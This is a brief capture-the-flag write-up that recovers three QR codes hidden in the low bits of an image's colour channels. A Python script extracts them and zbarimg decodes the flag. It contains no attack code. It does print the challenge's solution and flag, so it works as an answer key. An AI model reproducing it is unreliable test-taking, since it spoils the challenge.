* 3 qr code in the pictures, one for each color layer, red, blue, green

```python
#!/usr/bin/python2

from PIL import Image

im = Image.open('challenge.png')

lar = im.size[0]
hau = im.size[1]
orig_pix = im.load()

for k in range(0,3):
  bg = Image.new('RGB', (lar,hau), 'white')
  bg_pix = bg.load()
  final = []
  a = []
  for i in range(0,lar,2):
    buf = []
    for j in range(0,hau,2):
      red = orig_pix[i,j][0]
      green = orig_pix[i,j][1]
      blue = orig_pix[i,j][2]
      a = [red, green, blue]
      
      buf.append(red & 1)
      if a[k] & 1:
        bg_pix[i/2,j/2] = (255,255,255)
      else:
        bg_pix[i/2,j/2] = (0,0,0)
    final.append(buf)
  bg.save('qr'+str(k)+'.png')
```

```bash
$ for i in {0..2}; do zbarimg -q --raw qr$i.png; done | tr -d '\n'
IMTLD{st3g4n0Gr4pHY_s0m3t1M35_n33d5_s0m3_gu3sSiNg}
```
